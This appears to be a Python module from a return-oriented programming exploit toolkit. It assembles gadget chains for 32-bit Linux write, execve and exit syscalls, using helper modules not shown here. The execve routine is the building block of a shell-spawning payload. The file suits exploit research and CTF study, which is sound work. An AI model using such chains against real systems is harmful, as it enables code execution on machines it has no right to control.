from stage import *
from direct import *
from assembler import *

class Exploit:

    def __init__(self, bss, gadgets):
        self.heapLocation="0x%0.8X" % ( int(bss, 16) )
        self.stackLocation="0x%0.8X" % ( int(bss, 16) + 250 )
        
        self.assembler = Assembler(gadgets)
        self.direct=Direct(self.assembler, self.heapLocation)

    def write(self, string):
        action = {'EAX':{'LOAD': 4}, 'EBX':{'LOAD': 1}, 'ECX':{'STORE_DATA': string}, 'EDX':{'LOAD': len(string)}}
        self.direct.rop(action)
        self.direct.syscall()

    def execve(self, binary, argv):
        action = {'EAX':{'LOAD': 11},\
                  'EBX':{'STORE_DATA': binary},\
                  'ECX':{'STORE_ARRAY': argv},\
                  'EDX':{'LOAD': 0}}
        self.direct.rop(action)
        self.direct.syscall()

    def exit(self):
        action = {'EAX':{'LOAD': 1}, 'EBX':{'LOAD': 0}}
        self.direct.rop(action)
        self.direct.syscall()